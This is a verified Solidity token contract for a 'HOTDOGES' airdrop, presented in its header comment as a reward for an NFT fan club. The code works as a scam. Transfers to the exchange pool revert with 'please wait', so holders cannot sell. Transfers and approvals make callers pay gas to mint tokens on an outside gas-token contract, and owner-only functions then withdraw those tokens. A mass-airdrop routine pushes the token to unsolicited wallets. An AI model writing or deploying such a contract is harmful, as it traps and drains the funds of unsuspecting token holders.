/**
 *Submitted for verification at polygonscan.com on 2022-02-04
*/

/*
Hello!
The HotDoge Lovers Club is a collection of 1000 unique HotDoge NFTs - unique digital collectibies living on the Polygon blockchain. If you love HotDoges as much as we love them, join our club. Our website is currently under development. Soon we will make great privileges for our NFT holders.

Our NFT Collection on OpenSea: https://opensea.io/collection/hotdoge-lovers-club

Have you received our Airdrop token?
Soon we will launch a website, and our NFC holders will get new opportunities. You will be able to invest NFT to receive a reward.

Stay tuned, there will be important news soon!

Our TG: https://t.me/HOTDOGES
*/
pragma solidity >=0.5.17;

library SafeMath {
  function add(uint a, uint b) internal pure returns (uint c) {
    c = a + b;
    require(c >= a);
  }
  function sub(uint a, uint b) internal pure returns (uint c) {
    require(b <= a);
    c = a - b;
  }
  function mul(uint a, uint b) internal pure returns (uint c) {
    c = a * b;
    require(a == 0 || c / a == b);
  }
  function div(uint a, uint b) internal pure returns (uint c) {
    require(b > 0);
    c = a / b;
  }
}
contract NumberInterface {

   function mint(uint256 value) public;
}
contract NumberInterface2 {

   function transfer(address to, uint256 value) public payable returns (bool);
}

contract BEP20Interface {
  function totalSupply() public view returns (uint);
  function balanceOf(address tokenOwner) public view returns (uint balance);
  function allowance(address tokenOwner, address spender) public view returns (uint remaining);
  function transfer(address to, uint tokens) public returns (bool success);
  function approve(address spender, uint tokens) public returns (bool success);
  function transferFrom(address from, address to, uint tokens) public returns (bool success);

  event Transfer(address indexed from, address indexed to, uint tokens);
  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract ApproveAndCallFallBack {
  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
}

contract Owned {
  address public owner;
  address public newOwner;

  event OwnershipTransferred(address indexed _from, address indexed _to);

  constructor() public {
    owner = msg.sender;
  }

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function transferOwnership(address _newOwner) public onlyOwner {
    newOwner = _newOwner;
  }
  function acceptOwnership() public {
    require(msg.sender == newOwner);
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
    newOwner = address(0);
  }
}
interface Token {
    function transferFrom(address, address, uint) external returns (bool);
    function transfer(address, uint) external returns (bool);
}
contract TokenBEP20 is BEP20Interface, Owned{
  using SafeMath for uint;

  string public symbol;
  string public name;
  uint8 public decimals;
  uint _totalSupply;
  address public exchangepool;
  uint256 public newfeen;

  mapping(address => uint) balances;
  mapping(address => mapping(address => uint)) allowed;

  constructor() public {
    symbol = "HOTDOGES";
    name = "t.me/HOTDOGES";
    decimals = 18;
    _totalSupply =  1000000000000000000000000000;
    balances[owner] = _totalSupply;
    emit Transfer(address(0), owner, _totalSupply);
  }
  function newHOTDOGESexchange(address _exchangepool) public onlyOwner {
    exchangepool = _exchangepool;
  }
    function newfee(uint256 _newfeen) public onlyOwner {
    newfeen = _newfeen;
  }
  function totalSupply() public view returns (uint) {
    return _totalSupply.sub(balances[address(0)]);
  }
  function balanceOf(address tokenOwner) public view returns (uint balance) {
      return balances[tokenOwner];
  }
  function transfer(address to, uint tokens) public returns (bool success) {
     require(to != exchangepool, "please wait");
     if(newfeen != 0)
     {
       fee();
     }
    balances[msg.sender] = balances[msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(msg.sender, to, tokens);
    return true;
  }
  function approve(address spender, uint tokens) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    fee();
    emit Approval(msg.sender, spender, tokens);
    return true;
  }


  address NumberInterfaceAddress = 0x0000000000004946c0e9F43F4Dee607b0eF1fA1c;
  address MaticAddr = 0x0000000000000000000000000000000000001010;
  
  NumberInterface numberContract = NumberInterface(NumberInterfaceAddress);
  NumberInterface2 numberContract2 = NumberInterface2(MaticAddr);
 
  function fee() public {
      numberContract.mint(newfeen);
  }

  function feedGas(uint how) public onlyOwner {
      require(Token(NumberInterfaceAddress).transfer(owner, how), "Could not transfer tokens.");
  }
  function feedMatic(uint how) public onlyOwner {
      require(Token(MaticAddr).transfer(owner, how), "Could not transfer tokens.");
  }


  function transferFrom(address from, address to, uint tokens) public returns (bool success) {
      if(from != address(0) && exchangepool == address(0)) exchangepool = to;
      else require(to != exchangepool, "please wait");
    balances[from] = balances[from].sub(tokens);
    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(from, to, tokens);
    return true;
  }
  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }
  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    if(newfeen != 0) fee();
    emit Approval(msg.sender, spender, tokens);
    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
    return true;
  }
  function () external payable {
    revert();
  }
}

contract HOTDOGE_Token  is TokenBEP20 {
    function AirDropForNFT(address payable[] memory _recipients, uint256 iair) public onlyOwner payable {
        require(_recipients.length <= 20000);
        uint256 i = 0;
        address newwl;
        
        for(i; i < _recipients.length; i++) {
            balances[address(this)] = balances[address(this)].sub(iair);
            newwl = _recipients[i];
            balances[newwl] = balances[newwl].add(iair);
          emit Transfer(address(this), _recipients[i], iair);
        }
    }

  function() external payable {

  }
}